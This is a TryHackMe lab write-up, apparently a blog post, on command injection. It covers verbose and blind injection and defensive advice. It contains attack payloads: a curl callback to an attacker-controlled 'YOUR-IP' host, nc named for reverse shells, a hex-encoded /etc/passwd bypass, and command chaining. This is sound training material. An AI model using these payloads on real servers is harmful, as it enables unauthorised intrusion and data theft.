---
title: Command Injection (RCE) — TryHackMe
slug: command-injection
tags: [tryhackme, web, injection, rce]
summary: Command Injection (often called RCE) happens when user input gets shoved into a system command. If you can control that input, you can control the server — and servers are famously bad at saying “no.”
date: 2025-11-24
---

## TL;DR

- **Command Injection** lets you execute **OS commands** through a vulnerable application.
- It usually shows up as either **Verbose** (output is displayed) or **Blind** (no output, so you prove it indirectly).
- Your goal is always the same: **confirm execution**, **enumerate**, then **gain a stable foothold**.

If SQLi is “I can ask your database questions,” command injection is “I can ask your operating system to do my chores.”

---

## What Command Injection Is

Command injection occurs when an application builds a command like this:

```text
ping -c 1 <USER_INPUT>
```

…and then blindly executes it.

If the input isn’t strictly controlled, an attacker can append *their own* commands using separators/operators.

Why it’s a big deal:
- You’re no longer limited to the app’s features
- You can read files, leak secrets, pivot internally, and potentially pop a shell

In other words: **the app becomes a remote control for the server**. Not ideal for the server. Great for the attacker.

---

## How It’s Detected

Command injection usually falls into two buckets:

1) **Verbose command injection** (easy mode)
2) **Blind command injection** (still doable, just requires proof)

| Method | What you see | How you confirm | Typical payloads |
|---|---|---|---|
| Verbose | Output appears in the response | Output is printed directly (e.g., username, directory listing) | `whoami`, `id`, `ls`, `dir` |
| Blind | No output is shown | Timing delays, file writes, or network callbacks | `sleep`, `ping`, `timeout`, `curl` |

---

## Verbose Command Injection

This is the “thank you for printing my homework on the screen” version.

### Quick confirmation payloads

Linux:
```bash
whoami
id
pwd
ls
```

Windows:
```bat
whoami
dir
cd
```

If the output shows up, you’ve confirmed you can execute commands.

**Learning:** Always start with the simplest proof. If `whoami` prints, you don’t need to get fancy — you need to get dangerous.

---

## Blind Command Injection

Blind injection is when the application runs your command but doesn’t show you output. So instead of “see output,” your job is “prove behavior.”

### 1) Timing-based payloads

Linux:
```bash
sleep 5
ping -c 5 127.0.0.1
```

Windows:
```bat
timeout /t 5
ping -n 6 127.0.0.1
```

**How to interpret:**
- If the page hangs for ~5 seconds, that’s not “the server is sleepy,” that’s **execution**.

### 2) Output redirection to a file

Even if the app won’t show output, you can sometimes write it somewhere the app *can* read.

```bash
whoami > /tmp/who.txt
cat /tmp/who.txt
```

This works best when the application has some way to read files or when you can chain into a read operation.

### 3) Network callbacks (my favorite)

If outbound traffic is allowed, you can make the server talk back to you:

```text
; curl http://YOUR-IP/ping
```

If you see the request hit your listener, that’s confirmation.

**Learning:** Blind command injection is basically “trust issues, but with packets.” You don’t need output — you need evidence.

---

## Commonly Useful Payloads

### Linux

| Payload | Why it matters |
|---|---|
| `whoami` | Confirms the running user |
| `id` | Shows UID/GIDs (useful for privilege context) |
| `ls` | Enumerate files (configs, secrets, backups) |
| `pwd` | Confirms working directory |
| `cat <file>` | Reads files (when allowed) |
| `sleep` / `ping -c` | Timing-based proof for blind injection |
| `nc` | Possible reverse shell tool (when available) |

### Windows

| Payload | Why it matters |
|---|---|
| `whoami` | Confirms the running user |
| `dir` | Enumerate files |
| `cd` | Confirms working directory |
| `type <file>` | Reads files |
| `timeout` / `ping -n` | Timing-based proof for blind injection |

---

## Vulnerable Functions (aka “Please Don’t Do This”) 

Many command injection issues come from developers passing input into shell execution functions.

### PHP examples

```php
exec($cmd);
system($cmd);
passthru($cmd);
```

If `$cmd` contains user input without strict validation, the app becomes an accidental command launcher.

**Learning:** The vulnerability isn’t the function existing — it’s **untrusted input reaching the function**.

---

## Input Sanitization (and why it’s not enough by itself)

A lot of apps try to “sanitize” input by stripping characters like:

```text
; & | > <
```

That *can* help, but it’s not a silver bullet — attackers love bypasses, and filters tend to be brittle.

**Better defense philosophy:**
- Use **allowlists** (only permit known-good patterns)
- Avoid shells entirely where possible
- Use safer APIs (e.g., perform DNS lookup with a library, not `system("nslookup …")`)

---

## Bypassing Filters

If an application removes specific characters or strings, attackers can often use:
- alternate operators
- encoding tricks
- whitespace/variable expansion
- different command syntax

One classic bypass technique is using hex-encoded strings.

```php
$payload = "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";
```

This resolves to `/etc/passwd` at runtime in contexts where decoding occurs, bypassing naive text filters.

Payload references (use responsibly):
- https://github.com/payloadbox/command-injection-payload-list

---

## How I Completed This Room

The key technique that solved the room was **command chaining**, using a pattern like:

```bash
command1 & command2
```

This allowed executing additional commands even when the application tried to restrict input.

**Learning:** Filters don’t have to be perfect for you to win — they just have to be imperfect for you to slip through.

---

## Skills Learned

- Identifying **blind** vs **verbose** command injection
- Confirming execution using **timing-based payloads**
- Using **output redirection** to recover command results
- Understanding command **chaining** and why it bypasses weak filters
- Recognizing dangerous OS-execution patterns in code (e.g., `exec/system/passthru`)
- Thinking like an attacker: **prove → enumerate → foothold**

---

## Notes / Takeaways

- Don’t overcomplicate the first step: **prove execution fast** (`whoami`, `sleep 5`).
- Once confirmed, pivot into **enumeration** (users, directories, configs).
- If you can make the host call back to you, blind injection becomes a lot less blind.

Also: if your app is building shell commands out of user input… congrats, you built a command-and-control server. You just forgot to be the one controlling it.